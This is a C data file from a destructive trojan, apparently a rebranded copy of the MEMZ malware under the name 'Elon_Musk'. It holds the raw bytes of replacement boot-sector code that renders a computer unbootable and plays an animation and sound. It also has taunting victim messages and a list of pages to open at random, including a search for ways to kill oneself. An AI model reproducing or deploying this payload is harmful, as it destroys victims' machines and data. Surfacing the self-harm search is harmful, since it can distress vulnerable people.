#include "data.h"

#ifndef CLEAN
const unsigned char msg[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE Elon_Musk TROJAN.\r\n\r\nYour computer won't boot up again,\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill Elon_Musk will cause your system to be\r\ndestroyed instantly, so don't try it :D";
#endif

const char *sites[] = {
	"http://google.co.ck/search?q=best+way+to+kill+yourself",
	"http://google.co.ck/search?q=how+2+remove+a+virus",
	"http://google.co.ck/search?q=mcafee+vs+norton",
	"http://google.co.ck/search?q=how+to+send+a+virus+to+my+friend",
	"http://google.co.ck/search?q=minecraft+hax+download+no+virus",
	"http://google.co.ck/search?q=how+to+get+money",
	"http://google.co.ck/search?q=bonzi+buddy+download+free",
	"http://google.co.ck/search?q=how+2+buy+weed",
	"http://google.co.ck/search?q=how+to+code+a+virus+in+visual+basic",
	"http://google.co.ck/search?q=what+happens+if+you+delete+system32",
	"http://google.co.ck/search?q=g3t+r3kt",
	"http://google.co.ck/search?q=batch+virus+download",
	"http://google.co.ck/search?q=virus.exe",
	"http://google.co.ck/search?q=internet+explorer+is+the+best+browser",
	"http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2016",
	"http://google.co.ck/search?q=virus+builder+legit+free+download",
	"http://google.co.ck/search?q=how+to+create+your+own+ransomware",
	"http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
	"http://google.co.ck/search?q=half+life+3+release+date",
	"http://google.co.ck/search?q=is+illuminati+real",
	"http://google.co.ck/search?q=montage+parody+making+program+2016",
	"http://google.co.ck/search?q=stanky+danky+maymays",
	"http://google.co.ck/search?q=john+cena+midi+legit+not+converted",
	"http://google.co.ck/search?q=vinesauce+meme+collection",
	"http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi",
	"http://motherboard.vice.com/read/watch-this-malware-turn-a-computer-into-a-digital-hellscape",
	"http://play.clubpenguin.com",
	"http://pcoptimizerpro.com",
	"http://softonic.com",
	"calc",
	"notepad",
	"cmd",
	"write",
	"regedit",
	"explorer",
	"taskmgr",
	"msconfig",
	"mspaint",
	"devmgmt.msc",
	"control",
	"mmc",
};

const size_t nSites = sizeof(sites) / sizeof(void *);

#ifndef CLEAN
const char *msgs[] = {
	"YOU KILLED MY TROJAN!\r\nNow you are going to die.",
	"REST IN PISS, FOREVER MISS.",
	"I WARNED YOU...",
	"HAHA N00B L2P G3T R3KT",
	"You failed at your 1337 h4x0r skillz.",
	"YOU TRIED SO HARD AND GOT SO FAR, BUT IN THE END, YOUR PC WAS STILL FUCKED!",
	"HACKER!\r\nENJOY BAN!",
	"GET BETTER HAX NEXT TIME xD",
	"HAVE FUN TRYING TO RESTORE YOUR DATA :D",
  "'Uh, I am Frank South 20",
  ", I love Elon Musk", 
};

const size_t nMsgs = sizeof(msgs) / sizeof(void *);
#endif

const char *sounds[] = {
	"SystemHand",
	"SystemQuestion",
	"SystemExclamation"
};

const size_t nSounds = sizeof(sounds) / sizeof(void *);


#ifndef CLEAN


const unsigned char code1[] = {
	0xBB, 0xE0, 0x07, 0x8E, 0xC3, 0x8E, 0xDB, 0xB8, 0x04, 0x02, 0xB9, 0x02,
	0x00, 0xB6, 0x00, 0xBB, 0x00, 0x00, 0xCD, 0x13, 0x31, 0xC0, 0x89, 0xC3,
	0x89, 0xC1, 0x89, 0xC2, 0xBE, 0x00, 0x00, 0xBF, 0x00, 0x40, 0xAC, 0x81,
	0xFE, 0x9E, 0x07, 0x73, 0x35, 0x3C, 0x80, 0x73, 0x03, 0xE9, 0x10, 0x00,
	0x24, 0x7F, 0x88, 0xC1, 0xAC, 0xAA, 0xFE, 0xC9, 0x80, 0xF9, 0xFF, 0x75,
	0xF7, 0xE9, 0xE2, 0xFF, 0x88, 0xC4, 0xAC, 0x89, 0xC3, 0xAC, 0x89, 0xF2,
	0x89, 0xDE, 0x81, 0xC6, 0x00, 0x40, 0x88, 0xC1, 0xAC, 0xAA, 0xFE, 0xC9,
	0x80, 0xF9, 0x00, 0x75, 0xF7, 0x89, 0xD6, 0xE9, 0xC4, 0xFF, 0xB0, 0xB6,
	0xE6, 0x43, 0xB8, 0x03, 0x10, 0xB3, 0x00, 0xCD, 0x10, 0xBF, 0x00, 0x00,
	0xBA, 0xC0, 0x9D, 0xB9, 0x00, 0xB8, 0x8E, 0xC1, 0xB8, 0x00, 0x00, 0xB9,
	0xD0, 0x07, 0xF3, 0xAB, 0xBE, 0x9C, 0x9F, 0xBF, 0x00, 0x00, 0xE4, 0x61,
	0x0C, 0x03, 0xE6, 0x61, 0xB3, 0x01, 0x52, 0xB4, 0x86, 0xB9, 0x00, 0x00,
	0xBA, 0x00, 0x60, 0xCD, 0x15, 0x5A, 0x81, 0xFE, 0xE8, 0x9F, 0x7D, 0x04,
	0xAC, 0xB4, 0xF0, 0xAB, 0xFE, 0xCB, 0x80, 0xFB, 0x00, 0x75, 0xE3, 0x56,
	0x89, 0xD6, 0xAD, 0x89, 0xC1, 0x80, 0xE4, 0x1F, 0xE6, 0x42, 0x88, 0xE0,
	0xE6, 0x42, 0xC0, 0xED, 0x05, 0xC0, 0xE5, 0x02, 0x88, 0xEB, 0x89, 0xF2,
	0x5E, 0x81, 0xFA, 0xF4, 0x9D, 0x75, 0xC3, 0xBE, 0x00, 0x40, 0xBF, 0x00,
	0x00, 0xB8, 0xE0, 0x07, 0x8E, 0xD8, 0xB8, 0x00, 0xB8, 0x8E, 0xC0, 0xFE,
	0xCB, 0xE9, 0x20, 0x00, 0xB0, 0xDC, 0xAA, 0xAC, 0xAA, 0x81, 0xFE, 0xC0,
	0x9D, 0x74, 0x42, 0x81, 0xFF, 0xA0, 0x0F, 0x74, 0x03, 0xE9, 0xEC, 0xFF,
	0x52, 0xB4, 0x86, 0xB9, 0x01, 0x00, 0xBA, 0x00, 0x60, 0xCD, 0x15, 0x5A,
	0xBF, 0x00, 0x00, 0x81, 0xFA, 0x9C, 0x9F, 0x75, 0x03, 0xBA, 0xF4, 0x9D,
	0xFE, 0xCB, 0x80, 0xFB, 0x00, 0x75, 0xCD, 0x56, 0x89, 0xD6, 0xAD, 0x89,
	0xC1, 0x80, 0xE4, 0x1F, 0xE6, 0x42, 0x88, 0xE0, 0xE6, 0x42, 0xC0, 0xED,
	0x05, 0x88, 0xEB, 0x89, 0xF2, 0x5E, 0xE9, 0xB3, 0xFF, 0xBE, 0x00, 0x40,
	0xE9, 0xC1, 0xFF
};

const unsigned char code2[] = {
	0x55, 0xAA, 0x83, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x04, 0x00, 0x00,
	0x08, 0x00, 0x00, 0x10, 0x00, 0x00, 0x20, 0x00, 0x35, 0x0B, 0x83, 0xF1,
	0xF1, 0x11, 0xF1, 0x00, 0x00, 0x4B, 0x00, 0x96, 0x04, 0x80, 0xFF, 0x00,
	0x4F, 0x4F, 0x00, 0x9F, 0x4F, 0x00, 0xEA, 0x53, 0x82, 0x1F, 0xF1, 0x1F,
	0x01, 0x42, 0x4E, 0x00, 0x4E, 0x50, 0x02, 0x12, 0x1F, 0x83, 0x10, 0x10,
	0x10, 0x10, 0x02, 0x50, 0x04, 0x02, 0x50, 0x08, 0x80, 0x10, 0x02, 0x31,
	0x1F, 0x83, 0x14, 0x14, 0x14, 0x14, 0x02, 0x80, 0x04, 0x83, 0x44, 0x44,
	0x44, 0x44, 0x02, 0x88, 0x04, 0x02, 0x80, 0x0E, 0x87, 0x40, 0x0E, 0xEE,
	0xEE, 0xED, 0xED, 0xED, 0xED, 0x02, 0xA2, 0x04, 0x02, 0xA5, 0x05, 0x82,
	0xEE, 0xEE, 0x0E, 0x02, 0x60, 0x1E, 0x02, 0x88, 0x08, 0x83, 0x46, 0x46,
	0x46, 0x46, 0x02, 0xD8, 0x04, 0x02, 0xD0, 0x0E, 0x8C, 0x00, 0xEE, 0xED,
	0xDD, 0xDC, 0xDD, 0xDD, 0xDD, 0xDD, 0xCD, 0xDD, 0xDD, 0xCD, 0x02, 0xF3,
	0x04, 0x83, 0xDD, 0xED, 0xEE, 0x00, 0x02, 0xB3, 0x1D, 0x83, 0x66, 0x66,
	0x66, 0x66, 0x03, 0x20, 0x04, 0x03, 0x20, 0x08, 0x03, 0x22, 0x0E, 0x81,
	0x00, 0xEE, 0x02, 0xFB, 0x05, 0x03, 0x41, 0x04, 0x83, 0xD0, 0x07, 0x07,
	0xD0, 0x02, 0xF9, 0x04, 0x84, 0xEE, 0x00, 0x10, 0x07, 0x07, 0x02, 0xB2,
	0x1A, 0x83, 0x6E, 0x6E, 0x6E, 0x6E, 0x03, 0x70, 0x04, 0x83, 0xEE, 0xEE,
	0xEE, 0xEE, 0x03, 0x78, 0x04, 0x03, 0x70, 0x08, 0x85, 0x00, 0x07, 0x07,
	0x00, 0xE0, 0xEE, 0x03, 0x3E, 0x08, 0x8F, 0xCD, 0xDD, 0xDD, 0x00, 0x77,
	0x77, 0x77, 0x07, 0xD0, 0xD0, 0xD0, 0xE0, 0x07, 0x77, 0x77, 0x77, 0x03,
	0x02, 0x1A, 0x03, 0x78, 0x08, 0x83, 0xEA, 0xEA, 0xEA, 0xEA, 0x03, 0xC8,
	0x04, 0x03, 0xC0, 0x08, 0x85, 0x0A, 0x00, 0x70, 0x77, 0x07, 0x00, 0x03,
	0x8E, 0x05, 0x02, 0xFA, 0x04, 0x81, 0xDC, 0xD0, 0x03, 0xA2, 0x04, 0x80,
	0x77, 0x03, 0xEA, 0x04, 0x03, 0xEE, 0x04, 0x03, 0x55, 0x1A, 0x83, 0xAA,
	0xAA, 0xAA, 0xAA, 0x04, 0x10, 0x04, 0x04, 0x10, 0x08, 0x04, 0x16, 0x0A,
	0x85, 0x0A, 0x00, 0x70, 0x70, 0x00, 0xEE, 0x02, 0xF9, 0x07, 0x03, 0x98,
	0x05, 0x80, 0xF0, 0x04, 0x38, 0x04, 0x80, 0x70, 0x04, 0x3B, 0x05, 0x03,
	0xA6, 0x19, 0x83, 0xA3, 0xA3, 0xA3, 0xA3, 0x04, 0x60, 0x04, 0x83, 0x33,
	0x33, 0x33, 0x33, 0x04, 0x68, 0x04, 0x04, 0x60, 0x0D, 0x83, 0x03, 0x00,
	0xEE, 0xDE, 0x02, 0xF1, 0x04, 0x03, 0x96, 0x07, 0x81, 0x77, 0x70, 0x04,
	0x3F, 0x04, 0x04, 0x8C, 0x04, 0x04, 0x46, 0x1A, 0x04, 0x68, 0x08, 0x87,
	0x39, 0x39, 0x39, 0x39, 0xF9, 0x39, 0x39, 0x39, 0x04, 0xB0, 0x0C, 0x9A,
	0x39, 0x30, 0x00, 0xE0, 0xEE, 0xEE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE, 0xDE,
	0xDE, 0x0E, 0x70, 0x77, 0x77, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
	0x77, 0x70, 0x01, 0x03, 0xA7, 0x19, 0x83, 0x99, 0x99, 0x99, 0x99, 0x05,
	0x00, 0x04, 0x81, 0x99, 0x9F, 0x05, 0x04, 0x06, 0x05, 0x00, 0x09, 0x88,
	0x99, 0x99, 0x99, 0x00, 0x77, 0x77, 0x70, 0x00, 0x01, 0x03, 0x88, 0x04,
	0x83, 0x01, 0x01, 0x01, 0x01, 0x05, 0x21, 0x06, 0x05, 0x2B, 0x05, 0x03,
	0x05, 0x1B, 0x83, 0x91, 0x91, 0x91, 0x91, 0x05, 0x50, 0x04, 0x05, 0x48,
	0x10, 0x05, 0x5C, 0x04, 0x05, 0x27, 0x04, 0x05, 0x6A, 0x05, 0x05, 0x59,
	0x07, 0x05, 0x6D, 0x07, 0x01, 0xB8, 0x98, 0x00, 0x9F, 0xF1, 0x06, 0x99,
	0x73, 0x05, 0xAC, 0x93, 0x07, 0x7F, 0x06, 0x07, 0x7F, 0x4B, 0x82, 0xF1,
	0x11, 0x1F, 0x05, 0xAB, 0xFF, 0x08, 0xAA, 0xBB, 0x02, 0x50, 0xF9, 0x03,
	0x48, 0x05, 0x03, 0x4E, 0x05, 0x80, 0x11, 0x03, 0x53, 0x1C, 0x03, 0x70,
	0x18, 0x84, 0xEE, 0xE0, 0xE0, 0xEE, 0xEE, 0x03, 0x8D, 0x0C, 0x03, 0x98,
	0x08, 0x81, 0xE0, 0x00, 0x03, 0xA2, 0x1D, 0x03, 0xC0, 0x18, 0x04, 0x44,
	0x04, 0x81, 0xE0, 0xE0, 0x03, 0xDE, 0x0A, 0x80, 0xDD, 0x03, 0xE8, 0x27,
	0x04, 0x11, 0x1A, 0x83, 0x70, 0x70, 0x77, 0x77, 0x04, 0x2E, 0x0A, 0x04,
	0x37, 0x28, 0x04, 0x60, 0x1C, 0x80, 0x03, 0x04, 0x7D, 0x0B, 0x04, 0x87,
	0x28, 0x04, 0xC0, 0x0D, 0x04, 0xBD, 0x10, 0x80, 0x39, 0x04, 0xCE, 0x0B,
	0x04, 0xD8, 0x27, 0x05, 0x10, 0x0C, 0x0C, 0xD0, 0x0C, 0x05, 0x17, 0x08,
	0x05, 0x20, 0x0B, 0x05, 0x2A, 0x25, 0x05, 0x62, 0x06, 0x80, 0xF1, 0x05,
	0x57, 0x15, 0x05, 0x71, 0x07, 0x05, 0x72, 0x11, 0x05, 0x82, 0x2A, 0x05,
	0xAD, 0xFF, 0x06, 0xB1, 0xFF, 0x07, 0xB5, 0xAE, 0x81, 0x11, 0x11, 0x01,
	0x92, 0x4F, 0x00, 0xDC, 0xB5, 0x0E, 0xFC, 0x9C, 0x00, 0x4B, 0x54, 0x0A,
	0x59, 0x15, 0x12, 0x25, 0x0A, 0x84, 0x10, 0x0E, 0x0E, 0x0E, 0x0E, 0x12,
	0x40, 0x04, 0x12, 0x40, 0x08, 0x0A, 0x81, 0x1F, 0x80, 0x11, 0x0A, 0xA9,
	0x15, 0x12, 0x75, 0x09, 0x83, 0x00, 0xEE, 0xEE, 0xED, 0x0C, 0x04, 0x05,
	0x80, 0xDC, 0x0B, 0xB5, 0x04, 0x0A, 0xCD, 0x05, 0x0A, 0xD1, 0x41, 0x0C,
	0x01, 0x08, 0x82, 0xDD, 0xD0, 0xD0, 0x12, 0x99, 0x04, 0x12, 0xA1, 0x04,
	0x0A, 0x2F, 0x1B, 0x0B, 0x49, 0x10, 0x13, 0x10, 0x0E, 0x0B, 0x5E, 0x08,
	0x12, 0x9A, 0x04, 0x80, 0x00, 0x0B, 0x6C, 0x04, 0x03, 0x4F, 0x06, 0x0B,
	0x75, 0x1B, 0x0B, 0x99, 0x0F, 0x0B, 0x98, 0x0F, 0x13, 0x2E, 0x05, 0x12,
	0x9A, 0x05, 0x0C, 0x57, 0x07, 0x0C, 0xB1, 0x05, 0x0B, 0x74, 0x1C, 0x04,
	0x10, 0x1A, 0x82, 0xA0, 0xA0, 0xA0, 0x03, 0xDD, 0x04, 0x13, 0x83, 0x06,
	0x80, 0xCD, 0x13, 0x89, 0x05, 0x80, 0x7F, 0x0C, 0x64, 0x04, 0x13, 0xDB,
	0x06, 0x0C, 0x68, 0x1F, 0x0C, 0x30, 0x11, 0x0B, 0x72, 0x04, 0x04, 0x2C,
	0x05, 0x13, 0x32, 0x0B, 0x80, 0x77, 0x13, 0x91, 0x05, 0x80, 0x07, 0x14,
	0x2C, 0x05, 0x13, 0xE8, 0x18, 0x0C, 0x89, 0x15, 0x14, 0x55, 0x04, 0x88,
	0x03, 0x03, 0x03, 0x03, 0x33, 0x00, 0xEE, 0xEE, 0xDE, 0x12, 0xE2, 0x07,
	0x80, 0x0D, 0x0C, 0x64, 0x05, 0x81, 0x70, 0x70, 0x04, 0x2B, 0x04, 0x80,
	0x77, 0x0C, 0xB5, 0x1A, 0x05, 0x0E, 0x0E, 0x0C, 0xDD, 0x11, 0x84, 0x07,
	0xE0, 0xE0, 0xE0, 0xE0, 0x14, 0xC0, 0x04, 0x87, 0xE0, 0xE0, 0xE0, 0x00,
	0x70, 0x70, 0x70, 0x70, 0x14, 0xCC, 0x04, 0x80, 0x70, 0x04, 0xE5, 0x1B,
	0x81, 0xF1, 0x1F, 0x11, 0xCF, 0x05, 0x05, 0x50, 0x17, 0x80, 0x00, 0x14,
	0xD4, 0x04, 0x82, 0x01, 0x70, 0x70, 0x14, 0x38, 0x07, 0x15, 0x13, 0x05,
	0x15, 0x13, 0x0A, 0x05, 0xAD, 0xFF, 0x0F, 0xE2, 0xE7, 0x0F, 0xD9, 0x93,
	0x05, 0xAC, 0xFF, 0x16, 0x23, 0xA0, 0x17, 0xA5, 0x04, 0x08, 0x18, 0x4D,
	0x08, 0x14, 0x5B, 0x12, 0x20, 0xFF, 0x13, 0x1F, 0xAD, 0x81, 0x07, 0x07,
	0x13, 0xCE, 0x4A, 0x83, 0xA0, 0x07, 0x77, 0x70, 0x14, 0x1C, 0x4C, 0x84,
	0x03, 0x70, 0x70, 0x03, 0x33, 0x14, 0x6D, 0x34, 0x14, 0xA2, 0x1C, 0x81,
	0x90, 0x07, 0x14, 0xBF, 0x31, 0x05, 0x49, 0x1D, 0x15, 0x0E, 0xFF, 0x18,
	0x97, 0xFF, 0x08, 0x15, 0x94, 0x14, 0xF0, 0x07, 0x05, 0xAD, 0xFF, 0x16,
	0x2D, 0xFF, 0x20, 0x84, 0x4C, 0x0A, 0x50, 0x1E, 0x81, 0x44, 0x40, 0x1A,
	0x10, 0x30, 0x0A, 0xA0, 0x20, 0x1A, 0x60, 0x5A, 0x81, 0xD0, 0xD0, 0x22,
	0x38, 0x05, 0x0B, 0x21, 0x04, 0x21, 0xF1, 0x1B, 0x0B, 0x40, 0x19, 0x1B,
	0x49, 0x0A, 0x22, 0x34, 0x06, 0x1B, 0x0A, 0x07, 0x81, 0xDD, 0xEE, 0x14,
	0x18, 0x04, 0x03, 0xA6, 0x31, 0x81, 0xE0, 0x07, 0x03, 0x89, 0x04, 0x0B,
	0xAD, 0x06, 0x1B, 0xA1, 0x06, 0x1B, 0x5A, 0x26, 0x1B, 0x7F, 0x18, 0x81,
	0x0A, 0x0A, 0x1C, 0xA2, 0x04, 0x1B, 0x9D, 0x0B, 0x1B, 0xA9, 0x27, 0x0C,
	0x2F, 0x21, 0x22, 0xD1, 0x0B, 0x1B, 0xFC, 0x24, 0x0C, 0x7F, 0x1E, 0x80,
	0x30, 0x1C, 0x3E, 0x0A, 0x1C, 0x49, 0x27, 0x1C, 0x6F, 0x1C, 0x80, 0x90,
	0x23, 0x18, 0x06, 0x1C, 0x93, 0x2E, 0x05, 0x50, 0x1B, 0x15, 0x0E, 0xFF,
	0x10, 0xD9, 0xF8, 0x80, 0xF1, 0x26, 0x50, 0x4D, 0x00, 0x9E, 0x47, 0x82,
	0xF1, 0xF1, 0x1F, 0x26, 0xA2, 0x4E, 0x05, 0xAB, 0xFF, 0x06, 0xE0, 0xFF,
	0x21, 0xB6, 0xD3, 0x03, 0x49, 0x05, 0x22, 0x8E, 0x05, 0x03, 0x53, 0x35,
	0x0B, 0x58, 0x0E, 0x23, 0xC5, 0x08, 0x03, 0x9E, 0x3A, 0x0B, 0xA8, 0x0B,
	0x2A, 0x0A, 0x05, 0x03, 0xE8, 0x41, 0x0B, 0xF9, 0x08, 0x23, 0x71, 0x0B,
	0x04, 0x3C, 0x40, 0x23, 0xBC, 0x10, 0x04, 0x8C, 0x30, 0x23, 0xFC, 0x1C,
	0x24, 0x17, 0x05, 0x0C, 0xAE, 0x22, 0x80, 0x1F, 0x24, 0x40, 0x1D, 0x80,
	0x77, 0x24, 0x5E, 0x0C, 0x86, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x0C, 0xF4, 0x04, 0x29, 0x0C, 0x1B, 0x24, 0x90, 0x20, 0x2C, 0x7B, 0x05,
	0x2C, 0x6B, 0x05, 0x24, 0xAB, 0x0F, 0x00, 0x38, 0xFF, 0x2D, 0x19, 0x7F,
	0x2C, 0xFF, 0x4E, 0x27, 0x37, 0x98, 0x26, 0x9D, 0x9A, 0x05, 0xAD, 0xFF,
	0x25, 0xF5, 0x5A, 0x1F, 0x6F, 0x40, 0x0A, 0x20, 0x30, 0x19, 0xF0, 0x1E,
	0x80, 0x10, 0x0A, 0x6F, 0x31, 0x1A, 0x40, 0x20, 0x02, 0xF0, 0x80, 0x1A,
	0xE0, 0x18, 0x0D, 0x01, 0x04, 0x80, 0x60, 0x1A, 0xFD, 0x09, 0x03, 0x96,
	0x2A, 0x1B, 0x30, 0x18, 0x80, 0x0E, 0x03, 0xD9, 0x87, 0x1B, 0xD0, 0x18,
	0x33, 0x4A, 0x05, 0x04, 0x7D, 0x33, 0x14, 0x50, 0x19, 0x33, 0x9B, 0x04,
	0x04, 0xCD, 0x29, 0x30, 0xA1, 0x0A, 0x0C, 0xD1, 0x1F, 0x05, 0x1F, 0x25,
	0x1E, 0x89, 0x13, 0x2C, 0x60, 0x15, 0x05, 0x6C, 0x27, 0x08, 0x12, 0xFF,
	0x30, 0x33, 0xFD, 0x07, 0xBE, 0xFF, 0x2D, 0x1A, 0xFF, 0x2E, 0x19, 0x93,
	0x31, 0x36, 0x0B, 0x80, 0xF0, 0x31, 0x3C, 0xED, 0x0B, 0x19, 0x27, 0x1A,
	0xE0, 0x19, 0x81, 0x60, 0x60, 0x1A, 0xFB, 0x0B, 0x0B, 0x66, 0x2A, 0x32,
	0xA0, 0x18, 0x0B, 0xA8, 0x88, 0x33, 0x40, 0x1C, 0x0C, 0x4C, 0x34, 0x33,
	0x90, 0x1D, 0x80, 0x33, 0x0C, 0x9E, 0x1F, 0x35, 0xE0, 0x13, 0x0C, 0xD0,
	0x50, 0x24, 0x89, 0x1D, 0x0D, 0x3D, 0x1D, 0x0F, 0xD9, 0xFF, 0x06, 0xBC,
	0xFF, 0x0F, 0x88, 0xFF, 0x10, 0x84, 0xFF, 0x26, 0x54, 0xCA, 0x21, 0xC0,
	0xCA, 0x1A, 0xBA, 0x26, 0x22, 0xB0, 0x29, 0x1B, 0x09, 0x27, 0x2A, 0xD0,
	0x18, 0x42, 0x4A, 0x06, 0x13, 0x7E, 0x82, 0x2B, 0x70, 0x18, 0x14, 0x18,
	0x38, 0x2B, 0xC0, 0x19, 0x84, 0x09, 0x09, 0x09, 0x09, 0x39, 0x1C, 0x3E,
	0x4F, 0x14, 0xBD, 0x33, 0x05, 0x50, 0x1C, 0x24, 0xA9, 0x15, 0x80, 0xF1,
	0x15, 0x22, 0xFF, 0x16, 0x51, 0xFF, 0x17, 0x50, 0xFF, 0x18, 0x4D, 0xFF,
	0x36, 0x7C, 0xD2, 0x41, 0x00, 0xFF, 0x41, 0xFF, 0xAD, 0x1B, 0x9C, 0x34,
	0x42, 0xE0, 0x18, 0x80, 0x30, 0x1B, 0xE9, 0x37, 0x43, 0x30, 0x18, 0x84,
	0x09, 0x70, 0x70, 0x09, 0x39, 0x43, 0x4D, 0x50, 0x1C, 0x8D, 0x33, 0x43,
	0xD0, 0x1D, 0x43, 0xEE, 0x0C, 0x82, 0xF1, 0xF1, 0x1F, 0x24, 0xBA, 0x4F,
	0x46, 0x55, 0xD1, 0x1E, 0x3B, 0xFF, 0x01, 0x5B, 0x37, 0x05, 0xAD, 0xFF,
	0x16, 0x29, 0xFF, 0x4F, 0x30, 0x80, 0x19, 0xF0, 0xCA, 0x22, 0x8A, 0x26,
	0x1A, 0xE0, 0x29, 0x22, 0xD9, 0x27, 0x3A, 0x70, 0x17, 0x23, 0x17, 0x89,
	0x3B, 0x10, 0x20, 0x23, 0xC0, 0x30, 0x33, 0x90, 0x1F, 0x24, 0x0F, 0x81,
	0x4B, 0x99, 0x1B, 0x4B, 0xBD, 0x04, 0x44, 0x01, 0x05, 0x40, 0x84, 0x06,
	0x4B, 0xCC, 0x48, 0x2F, 0x50, 0xD0, 0x3F, 0xE2, 0x9D, 0x40, 0x81, 0x04,
	0x2F, 0x01, 0xFF, 0x05, 0xAD, 0xFF, 0x06, 0xFA, 0xFF, 0x50, 0x80, 0xE9,
	0x2A, 0x59, 0x27, 0x3A, 0x20, 0x26, 0x2A, 0xA6, 0x2A, 0x3A, 0x70, 0x23,
	0x2A, 0xF3, 0x7D, 0x52, 0x80, 0x2C, 0x33, 0x6C, 0x3B, 0x80, 0x3F, 0x52,
	0xE8, 0x10, 0x2B, 0xE8, 0x27, 0x53, 0x1F, 0x16, 0x80, 0xF9, 0x5B, 0x02,
	0x04, 0x2C, 0x2A, 0x35, 0x53, 0x6F, 0x15, 0x80, 0xF1, 0x5B, 0x45, 0x05,
	0x80, 0xF1, 0x2C, 0x7B, 0x31, 0x08, 0x4A, 0xFF, 0x57, 0x90, 0x97, 0x5C,
	0xD1, 0x4F, 0x5D, 0x22, 0x4F, 0x87, 0x7E, 0x27, 0x12, 0x27, 0x4C, 0x46,
	0xB8, 0x44, 0x5D, 0xC0, 0x05, 0x8E, 0x26, 0xB8, 0x24, 0x34, 0x24, 0xBF,
	0x23, 0x34, 0x24, 0x00, 0x25, 0xB8, 0x44, 0x4C, 0x46, 0x5D, 0xC0, 0x08,
	0x5D, 0xD4, 0x05, 0xA0, 0x24, 0x34, 0x24, 0x89, 0x23, 0xBF, 0x23, 0x89,
	0x23, 0x34, 0x24, 0x4C, 0x46, 0x9D, 0x45, 0x7E, 0x27, 0x7E, 0x27, 0x70,
	0x49, 0xF0, 0x27, 0x68, 0x28, 0x70, 0x29, 0x70, 0x69, 0x68, 0x48, 0xF0,
	0x47, 0x5D, 0xFE, 0x06, 0x87, 0x68, 0x28, 0x7E, 0x27, 0x4C, 0x26, 0x9D,
	0x25, 0x5E, 0x12, 0x04, 0x5E, 0x10, 0x04, 0x5E, 0x0E, 0x04, 0x85, 0x70,
	0x29, 0x7E, 0x47, 0x4C, 0x46, 0x5E, 0x16, 0x0C, 0x83, 0xF0, 0x27, 0x7E,
	0x27, 0x5E, 0x0A, 0x08, 0x81, 0xF0, 0x47, 0x5E, 0x0E, 0x08, 0x5E, 0x46,
	0x04, 0x5E, 0x3C, 0x05, 0x84, 0x48, 0x70, 0x49, 0x68, 0x48, 0x5D, 0xF4,
	0x66, 0x85, 0x70, 0x49, 0x99, 0x2C, 0x39, 0x2B, 0x5E, 0xC0, 0x06, 0x5E,
	0xAA, 0x06, 0x83, 0x70, 0x29, 0x12, 0x27, 0x5D, 0xC8, 0x06, 0x81, 0x70,
	0x49, 0x5E, 0xC6, 0x08, 0x81, 0x99, 0x2C, 0x5E, 0xD4, 0x04, 0x5E, 0xB6,
	0x04, 0x87, 0x99, 0x2C, 0xFB, 0x2E, 0x24, 0x2E, 0x99, 0x2C, 0x5E, 0xC0,
	0x0E, 0x5E, 0xCC, 0x08, 0x5F, 0x00, 0x04, 0x5E, 0xF6, 0x04, 0x83, 0x70,
	0x29, 0x00, 0x2A, 0x5F, 0x0C, 0x06, 0x5E, 0xD2, 0x0C, 0x81, 0x00, 0x4A,
	0x5E, 0xC0, 0x6C, 0xBC, 0x68, 0x48, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x63,
	0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65, 0x72, 0x20, 0x68, 0x61, 0x73, 0x20,
	0x62, 0x65, 0x65, 0x6E, 0x20, 0x74, 0x72, 0x61, 0x73, 0x68, 0x65, 0x64,
	0x20, 0x62, 0x79, 0x20, 0x74, 0x68, 0x65, 0x20, 0x4D, 0x45, 0x4D, 0x5A,
	0x20, 0x74, 0x72, 0x6F, 0x6A, 0x61, 0x6E, 0x2E, 0x20, 0x4E, 0x6F, 0x77,
	0x20, 0x65, 0x6E, 0x6A, 0x6F, 0x5F, 0xBC, 0x06, 0x8A, 0x4E, 0x79, 0x61,
	0x6E, 0x20, 0x43, 0x61, 0x74, 0x2E, 0x2E, 0x2E
};

const size_t code1_len = sizeof(code1);
const size_t code2_len = sizeof(code2);
const size_t msg_len = sizeof(msg);
#endif
